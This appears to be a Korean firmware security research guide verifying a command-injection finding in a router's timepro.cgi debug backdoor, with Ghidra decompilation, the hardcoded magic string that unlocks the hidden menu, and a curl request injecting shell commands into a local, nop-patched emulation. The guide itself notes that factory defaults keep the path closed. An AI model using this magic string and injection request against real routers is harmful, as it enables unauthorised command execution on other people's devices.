# CMDI-002 — `timepro.cgi`의 `cmd` 진단 백도어 — 검증 가이드

## 한눈에 요약
- 어떤 버그: 웹 요청의 `cmd` 값이 필터링 없이 그대로 셸 명령으로 실행됨 (OS Command Injection)
- 어디서: `cgibin/timepro.cgi`의 `show_debug_screen()` (제조사가 남겨둔 진단/디버그용 숨은 기능, `/cgibin/d.cgi`라는 별명으로도 접근됨)
- 왜 위험한가: 조건이 충족되면 라우터 웹 인터페이스에서 임의 명령 실행 가능
- 인증 필요 여부: **이 finding은 CMDI-005와 달리 "깨끗하게" 재현되지 않습니다.** 아래 1번을 꼭 먼저 읽으세요.
- 검증 상태: Evidence 2 (sink 메커니즘 자체는 실행으로 확인됨, 전체 도달 경로는 미확정)

## 1. 먼저 알아야 할 것 — 이 데모는 "게이트 4개를 강제로 뚫어놓은" 사본입니다

이 finding은 popen()에 도달하기 전에 **4개의 조건(게이트)**을 동시에 만족해야 합니다:

1. `act` 파라미터가 정확히 `"1"`
2. `aaksjdkfj` 파라미터가 하드코딩된 매직 문자열 `!@dnjsrurelqjrm*&`
3. `fdump` 파라미터가 없거나 `"on"`이 아님
4. **(위 3개와 별개로, 코드 진입 자체를 위해)** 관리자 원격지원 설정(`remote_support`)이 켜져 있고, 관리자 비밀번호가 기본값이 아니어야 하고, CSRF 검사를 통과해야 하고, 요청 URL이 `/cgibin/d.cgi` 형태로 라우팅돼야 함

1~3번은 순수하게 파라미터 값이라 curl로 그대로 재현 가능합니다. 하지만 4번은 실제 라우터의 **설정 파일, 세션 데몬, 웹서버(httpd) 라우팅 로직**에 의존하는데, 이번 QEMU 격리 환경에는 그런 실제 인프라가 없어서 "이 게이트가 진짜로 통과되는 조건이 무엇인지" 자체를 확인할 방법이 없습니다.

1~3번 게이트가 실제로 코드에서 어떻게 생겼는지, Ghidra 디컴파일 원문(`show_debug_screen @ 0x00410270`, 전체 출처: `../../../logs/08-ghidra-timepro.cgi.log:428-574`)으로 직접 보면 이렇습니다 — `aaksjdkfj` 파라미터를 17바이트 하드코딩 문자열과 한 글자씩 비교하는 부분을 눈으로 확인할 수 있습니다:

```c
void show_debug_screen(undefined4 param_1)
{
  iVar1 = get_remote_support();
  if ((iVar1 != 0) && (check_default_pass() == 0)) {              // 4번 게이트 (아래 참고)
    iVar1 = get_value(param_1,"act",auStack_38,0x20);
    if ( (iVar1==0 || strcmp(auStack_38,"1")!=0)                   // 1번: act == "1"
         || ( get_value(param_1,"aaksjdkfj",&local_2b8,0x100)!=0   // 2번: aaksjdkfj 매직 문자열
              && local_2b8=='!' && local_2b7=='@'
              && local_2b6=='d' && local_2b5=='n' && local_2b4=='j'
              && local_2b3=='s' && local_2b2=='r' && local_2b1=='u'
              && local_2b0=='r' && local_2af=='e' && local_2ae=='l'
              && local_2ad=='q' && local_2ac=='j' && local_2ab=='r'
              && local_2aa=='m' && local_2a9=='*' && local_2a8=='&' ) )
    {
      iVar1 = get_value(param_1,"act",auStack_38,0x20);
      if ( (iVar1==0 || strcmp(auStack_38,"1")!=0)
           || get_value(param_1,"fdump",auStack_38,0x20)==0        // 3번: fdump 생략 또는 "on" 아님
           || strcmp(auStack_38,"on")!=0 )
      {
        ... // 여기 안쪽이 cmd/popen 경로 (아래 2절)
      }
    }
  }
  return;
}
```

각 문자 비교(`local_2b8=='!'`, `local_2b7=='@'`, ...)를 순서대로 이어 읽으면 `!@dnjsrurelqjrm*&`가 되고, 이게 바로 curl 명령에 넣는 `aaksjdkfj` 값입니다. 이렇게 문자 하나씩 비교하는 방식은 컴파일러가 짧은 고정 문자열 비교를 최적화한 결과로, "매직 문자열이 하드코딩돼 있다"는 걸 코드 레벨에서 직접 확인시켜줍니다.

그래서 이전 분석 세션에서는 **분석용으로 딱 이 finding만을 위해 스테이징한 사본** (`rootfs/cgibin/timepro.cgi`, 원본 펌웨어 파일이 아님)의 어셈블리 코드에서 4번 조건을 검사하는 분기 명령 4곳을 `nop`(아무 동작도 안 함)으로 바꿔치기했습니다. **이건 "이 4개 게이트가 실제로 뚫린다"는 증명이 아니라, "이 게이트들이 통과됐다고 가정했을 때 그 뒤의 `cmd` 파라미터 → `popen()` 코드가 정말로 필터링 없이 명령을 실행하는지"만 따로 떼어서 확인하기 위한 테스트 기법**입니다. 원본 펌웨어 이미지(`extracted/manual/squashfs-root/`)는 전혀 건드리지 않았습니다.

**이 run.sh가 켜주는 환경은 바로 그 패치된 사본을 씁니다.** 아래 3~4번을 실행하면 popen() 부분이 실제로 얼마나 무방비인지는 명확히 볼 수 있지만, "인증 없이 이 요청 하나로 실제 라우터를 뚫을 수 있다"는 뜻은 **아닙니다** — 그 판단에는 실기기 조사가 추가로 필요합니다.

## 2. 코드에서 무슨 일이 벌어지나요? (popen 부분)

```c
strcpy(cmdbuf, "2>&1 ");
get_value(param_1, "cmd", cmdbuf+5, 0xfb);      // cmd 파라미터를 최대 251바이트까지 그대로 복사
printf("<b>command = %s</b><br><br>", cmdbuf+5); // 입력값을 화면에 그대로 되돌려줌 (디버그 흔적)
strcat(cmdbuf, " 2>&1");
popen(cmdbuf, "r");                              // *** 여기서 셸이 실행됨, 필터링 함수 호출 0건 ***
```
`cmd` 값에 어떤 문자를 넣어도(`;`, `` ` ``, `$()` 등) 걸러내는 코드가 **단 한 줄도 없습니다.** 이 firmware 계열 전체를 통틀어 검사했을 때, HTTP 파라미터가 셸 특수문자 필터링 없이 곧바로 `system()`/`popen()`에 들어가는 유일한 지점으로 표시된 곳입니다.

## 3. 환경 실행하기 (자동화됨)
```bash
cd analysis/emulation/CMDI-002
./run.sh
```
터미널에 큰 경고 배너와 함께 `http://127.0.0.1:8092/`가 뜹니다. 이 터미널은 그대로 두고 다른 터미널을 여세요.

## 4. 실제로 검증해보기

```bash
curl "http://127.0.0.1:8092/?act=1&aaksjdkfj=%21%40dnjsrurelqjrm%2A%26&cmd=echo%20A%3Becho%20B%3Bid"
```
(URL 인코딩을 풀면: `act=1`, `aaksjdkfj=!@dnjsrurelqjrm*&`, `cmd=echo A;echo B;id`)

`aaksjdkfj` 값을 일부러 틀리게 보내보면 (예: `aaksjdkfj=wrong`) `cmd` 값과 무관하게 명령이 실행되지 않는 것도 함께 비교해보세요 — 이게 바로 그 하드코딩된 매직 문자열이 진짜 게이트로 동작한다는 증거입니다.

## 5. 성공하면 어떻게 보이나요?

```
<b>command = echo A;echo B;id</b><br><br><pre>A
B
uid=1000(lkh) gid=1000(lkh) groups=...
</pre>
```
`command = ...` 줄은 우리가 보낸 `cmd` 값이 그대로 화면에 echo된 것이고, 그 아래 `A`/`B`/`uid=...`는 `popen()`이 실제로 그 명령을 셸에서 실행한 결과입니다.

## 6. 이게 왜 심각한가요?

- popen() 자체는 어떤 방어도 없이 완전히 뚫려 있습니다 — 이건 실행으로 확정된 사실입니다.
- 다만 이 코드에 도달하려면 4번(설정/세션/CSRF/URL라우팅) 조건이 실제 배포 환경에서 어떻게 동작하는지가 관건이며, 이건 **이 QEMU 검증만으로는 답할 수 없는 질문**입니다.
- **(2026-08-17 갱신) `remote_support` 기본값은 확인됐습니다 — 꺼져 있습니다.** 이 프로젝트의 공장 기본 설정 파일(`extracted/manual/squashfs-root/default/etc/iconfig.cfg`)에 `remote_support` 키 자체가 없고(`get_remote_support()`는 값이 없으면 0), 이 키를 켜는 CGI/웹폼/도구도 rootfs 전체에서 찾지 못했습니다. 같은 파일의 `login=admin`/`password=admin`(기본 계정) 때문에 `check_default_pass()==0` 조건도 공장 상태에서는 거짓입니다. 즉 **공장 출하 상태에서는 두 게이트가 모두 닫혀 있어 이 finding은 무인증 RCE가 아닙니다.** 관리자가 비밀번호를 바꾸고(1번 조건 통과) 동시에 `remote_support`를 켜야 하는데, 후자를 켜는 방법을 이 firmware 이미지 안에서 찾지 못했습니다. 상세: `../../candidates/CMDI-002.md`의 "Follow-up (2026-08-17)" 절.
- **배울 점**: 벤더가 진단/디버그용으로 남겨둔 "숨은 백도어" 기능(매직 문자열로 잠긴 디버그 메뉴)이 프로덕션 펌웨어에 그대로 남아있는 경우가 흔합니다. 다른 바이너리에서도 하드코딩된 이상한 문자열 상수와 비교하는 `strcmp`가 있으면 "이거 벤더 백도어 아닌가?"를 의심해볼 가치가 있습니다.

## 7. 참고 자료
- 정적 분석 원본: `../../candidates/CMDI-002.md`
- 이전 세션 동적 검증 전체 기록(4개 패치 주소, REQUEST_URI 분기 비교 strace 등): `results.md`
